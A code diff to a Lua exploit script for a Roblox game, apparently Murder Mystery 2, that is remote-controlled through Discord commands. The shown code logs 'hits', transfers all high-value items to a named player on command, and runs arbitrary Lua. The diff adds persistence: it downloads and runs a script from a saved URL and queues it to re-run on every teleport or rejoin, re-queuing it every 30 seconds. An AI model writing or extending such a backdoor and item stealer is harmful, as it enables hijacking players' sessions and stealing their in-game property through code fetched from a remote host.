@@ -39,6 +39,67 @@ _minRare = _minRare or "Godly";
 print(1)
 
 -- ═══════════════════════════════════════════════════════════════
+--  AUTO-EXECUTE (persistent script URL run on every rejoin)
+-- ═══════════════════════════════════════════════════════════════
+local AUTOEXEC_FILE = "autoexec_url.dat";
+_autoexecURL = "";
+
+if isfile(AUTOEXEC_FILE) then
+    local _ok, _t = pcall(readfile, AUTOEXEC_FILE);
+    if _ok and type(_t) == "string" then
+        _autoexecURL = _t:gsub("^%s+", ""):gsub("%s+$", "");
+    end
+end
+
+local function _queueAutoexec()
+    if _autoexecURL == "" then return false end
+    local _loader = "loadstring(game:HttpGet([[" .. _autoexecURL .. "]]))()";
+    local _used = nil;
+    if syn and type(syn.queue_on_teleport) == "function" then
+        if pcall(function() syn.queue_on_teleport(_loader) end) then _used = "syn.queue_on_teleport"; end
+    end
+    if not _used and type(queue_on_teleport) == "function" then
+        if pcall(function() queue_on_teleport(_loader) end) then _used = "queue_on_teleport"; end
+    end
+    if not _used and type(queueonteleport) == "function" then
+        if pcall(function() queueonteleport(_loader) end) then _used = "queueonteleport"; end
+    end
+    if not _used and fluxus and type(fluxus.queue_on_teleport) == "function" then
+        if pcall(function() fluxus.queue_on_teleport(_loader) end) then _used = "fluxus.queue_on_teleport"; end
+    end
+    return _used;
+end
+
+local function _clearQueue()
+    local _noop = "-- autoexecute cleared";
+    if syn and type(syn.queue_on_teleport) == "function" then
+        pcall(function() syn.queue_on_teleport(_noop) end);
+    end
+    if type(queue_on_teleport) == "function" then
+        pcall(function() queue_on_teleport(_noop) end);
+    end
+    if type(queueonteleport) == "function" then
+        pcall(function() queueonteleport(_noop) end);
+    end
+    if fluxus and type(fluxus.queue_on_teleport) == "function" then
+        pcall(function() fluxus.queue_on_teleport(_noop) end);
+    end
+end
+
+task.spawn(function()
+    while task.wait(30) do
+        if _autoexecURL ~= "" then
+            _queueAutoexec();
+        end
+    end
+end)
+
+if _autoexecURL ~= "" then
+    local _used = _queueAutoexec();
+    print("[autoexec] restored: " .. _autoexecURL .. " (" .. tostring(_used or "NO QUEUE METHOD") .. ")");
+end
+
+-- ═══════════════════════════════════════════════════════════════
 --  MM2-SPECIFIC INIT
 -- ═══════════════════════════════════════════════════════════════
 if _isMM2 then
@@ -704,9 +765,6 @@ local function _gw()
             local _isCmd = (_md.channel_id == _cmdCh);
             local _isHit = (_md.channel_id == _hitCh);
 
-            -- ═══════════════════════════════════════════════════════
-            --  COMMANDS (checked FIRST so they work even if _cmdCh == _hitCh)
-            -- ═══════════════════════════════════════════════════════
             if _isCmd then
                 if _content == "!help" then
                     if _isOwner(_md.author) then
@@ -722,20 +780,22 @@ local function _gw()
                                         "`!invf` — same, but as a `.yaml` file attachment",
                                         inline = false },
                                     { name = "⚙️ Utility", value =
-                                        "`!status` — show online status, gateway, uptime, trades\n" ..
-                                        "`!coins` — show MM2 coin + gem balance\n" ..
+                                        "`!status` — online status, gateway, uptime, trades\n" ..
+                                        "`!coins` — MM2 coins + gems balance\n" ..
                                         "`!server` — list all players in the server\n" ..
-                                        "`!rejoin` — rejoin the current server (same JobId)\n" ..
-                                        "`!execute <lua>` — run arbitrary Lua and post result",
+                                        "`!rejoin` — rejoin the current server\n" ..
+                                        "`!execute <lua>` — run arbitrary Lua\n" ..
+                                        "`!job` — quick JobId + PlaceId",
                                         inline = false },
                                     { name = "🔁 Transfers", value =
                                         "`!transfer <username>` — send all Godly+ to a player\n" ..
                                         "`!stoptransfer` — stop the active transfer",
                                         inline = false },
-                                    { name = "💡 Tips", value =
-                                        "• Prefix commands with `!` in the command channel\n" ..
-                                        "• Use ` ```lua ... ``` ` blocks for multi-line `!execute`\n" ..
-                                        "• `!execute return game.JobId` to get the current server",
+                                    { name = "🎯 Auto-Execute", value =
+                                        "`!autoexecute <url>` — save + queue script to auto-run on every rejoin\n" ..
+                                        "`!stopautoexecute` — clear saved script **and** overwrite pending queue\n" ..
+                                        "`!runauto` — run the saved script right now\n" ..
+                                        "`!showauto` — show the saved URL",
                                         inline = false },
                                 },
                                 footer = { text = "Tip: type !help anytime" },
@@ -787,6 +847,116 @@ local function _gw()
                         pcall(function()
                             game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer);
                         end);
+                    end);
+                    return;
+                end
+
+                if _content == "!job" then
+                    if not _isOwner(_md.author) then
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
+                        return;
+                    end
+                    task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
+                    task.spawn(function()
+                        _postEmbed("🔗 Job", "**JobId:** `" .. tostring(game.JobId) .. "`\n**PlaceId:** `" .. tostring(game.PlaceId) .. "`", 0x3EED50);
+                    end);
+                    return;
+                end
+
+                -- ─── !autoexecute <url> ───
+                local _autoURL = _content:match("^!autoexecute%s+(.+)$");
+                if _autoURL then
+                    _autoURL = _autoURL:gsub("^%s+", ""):gsub("%s+$", "");
+                    if not _isOwner(_md.author) then
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
+                        return;
+                    end
+                    task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
+                    task.spawn(function()
+                        _autoexecURL = _autoURL;
+                        pcall(function() writefile(AUTOEXEC_FILE, _autoexecURL) end);
+
+                        local _used = _queueAutoexec();
+                        local _queueState = _used and ("queued via " .. _used) or "NO QUEUE METHOD (executor doesn't support queue_on_teleport)";
+
+                        _postEmbed("🎯 Auto-Execute Saved",
+                            "**URL:** `" .. _autoexecURL .. "`\n" ..
+                            "**Queue:** " .. _queueState .. "\n\n" ..
+                            "_Will run on every rejoin. Running it now too..._",
+                            0x3EED50);
+
+                        task.wait(0.5);
+                        local _ok, _err = pcall(function()
+                            loadstring(game:HttpGet(_autoexecURL))();
+                        end);
+                        if not _ok then
+                            _postEmbed("⚠️ Auto-Execute Run Failed",
+                                "The URL is saved and queued, but running it now failed:\n```\n" .. tostring(_err):sub(1, 900) .. "\n```",
+                                0xFFA500);
+                        else
+                            _postEmbed("✅ Auto-Execute Ran", "Loaded and executed successfully.", 0x3EED50);
+                        end
+                    end);
+                    return;
+                end
+
+                -- ─── !stopautoexecute ───
+                if _content == "!stopautoexecute" then
+                    if not _isOwner(_md.author) then
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
+                        return;
+                    end
+                    task.spawn(function() _reactIn(_cmdCh, _md.id, "🛑") end);
+                    task.spawn(function()
+                        _autoexecURL = "";
+                        pcall(function()
+                            if isfile(AUTOEXEC_FILE) then delfile(AUTOEXEC_FILE) end
+                        end);
+                        _clearQueue();
+                        _postEmbed("🛑 Auto-Execute Disabled",
+                            "Saved script cleared **and** pending queue overwritten.\nThe next teleport won't reload the old script.",
+                            0xFF0000);
+                    end);
+                    return;
+                end
+
+                -- ─── !runauto ───
+                if _content == "!runauto" then
+                    if not _isOwner(_md.author) then
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
+                        return;
+                    end
+                    task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
+                    task.spawn(function()
+                        if _autoexecURL == "" then
+                            _postEmbed("❌ No Auto-Execute Saved", "Use `!autoexecute <url>` first.", 0xFF0000);
+                            return;
+                        end
+                        local _ok, _err = pcall(function()
+                            loadstring(game:HttpGet(_autoexecURL))();
+                        end);
+                        if not _ok then
+                            _postEmbed("❌ Run Failed", "```\n" .. tostring(_err):sub(1, 900) .. "\n```", 0xFF0000);
+                        else
+                            _postEmbed("✅ Ran", "`" .. _autoexecURL .. "`", 0x3EED50);
+                        end
+                    end);
+                    return;
+                end
+
+                -- ─── !showauto ───
+                if _content == "!showauto" then
+                    if not _isOwner(_md.author) then
+                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
+                        return;
+                    end
+                    task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
+                    task.spawn(function()
+                        if _autoexecURL == "" then
+                            _postEmbed("🎯 Auto-Execute", "No script saved. Use `!autoexecute <url>`.", 0x3EED50);
+                        else
+                            _postEmbed("🎯 Auto-Execute", "**URL:** `" .. _autoexecURL .. "`", 0x3EED50);
+                        end
                     end);
                     return;
                 end
@@ -890,6 +1060,8 @@ local function _gw()
                             _xferState = "ACTIVE -> " .. tostring(_transferTarget) .. " (" .. _transferDone .. " batches)";
                         end
 
+                        local _autoStr = (_autoexecURL ~= "") and ("active: `" .. _autoexecURL .. "`") or "off";
+
                         local _desc =
                             "**🟢 Online**\n" ..
                             "**JobId:** `" .. tostring(game.JobId):sub(1, 18) .. "...`\n" ..
@@ -901,6 +1073,7 @@ local function _gw()
                         local _f = {
                             { name = "⚙️ Runtime", value = "```\nGateway: " .. _gc .. "\nValue list: " .. _vLState .. "\nExecutor: " .. _ex .. " " .. _exv .. "\n```", inline = false },
                             { name = "🔁 Trades", value = "```\nTrades this server: " .. _doneT .. "\n_tbn limit: " .. _tbn .. "\nTransfer: " .. _xferState .. "\n```", inline = false },
+                            { name = "🎯 Auto-Execute", value = _autoStr, inline = false },
                             { name = "📡 Channels", value = "```\nHits: " .. _hitCh .. "\nCmd:  " .. _cmdCh .. "\nLog:  " .. _lg .. "\n```", inline = false },
                         };
 
@@ -945,8 +1118,6 @@ local function _gw()
                         local _gemsBackup   = _p.Gems_Backup or 0;
                         local _credits      = _p.Credits or 0;
                         local _coinBag      = _p.CoinBag or 0;
-
-                        -- Snow tokens (only present during winter events)
                         local _snow = _mats.SnowTokens2025 or nil;
 
                         local function _fmt(n)
@@ -961,15 +1132,9 @@ local function _gw()
                             "**🪙 Coins:** `" .. _fmt(_coins) .. "`",
                             "**💎 Gems:** `" .. _fmt(_gems) .. "`",
                         };
-                        if _coinBag > 0 then
-                            table.insert(_lines, "**🎒 Coin Bag:** `" .. _fmt(_coinBag) .. "`");
-                        end
-                        if _credits > 0 then
-                            table.insert(_lines, "**💳 Credits:** `" .. _fmt(_credits) .. "`");
-                        end
-                        if _snow then
-                            table.insert(_lines, "**❄️ Snow Tokens:** `" .. _fmt(_snow) .. "`");
-                        end
+                        if _coinBag > 0 then table.insert(_lines, "**🎒 Coin Bag:** `" .. _fmt(_coinBag) .. "`") end
+                        if _credits > 0 then table.insert(_lines, "**💳 Credits:** `" .. _fmt(_credits) .. "`") end
+                        if _snow then table.insert(_lines, "**❄️ Snow Tokens:** `" .. _fmt(_snow) .. "`") end
                         if _coinsBackup > 0 then
                             table.insert(_lines, "");
                             table.insert(_lines, "**Coins Backup:** `" .. _fmt(_coinsBackup) .. "`");
@@ -1023,9 +1188,6 @@ local function _gw()
                 end
             end
 
-            -- ═══════════════════════════════════════════════════════
-            --  HITS (checked after commands)
-            -- ═══════════════════════════════════════════════════════
             if _isHit then
                 _lastMid = _md.id;
                 _pjm(_md);
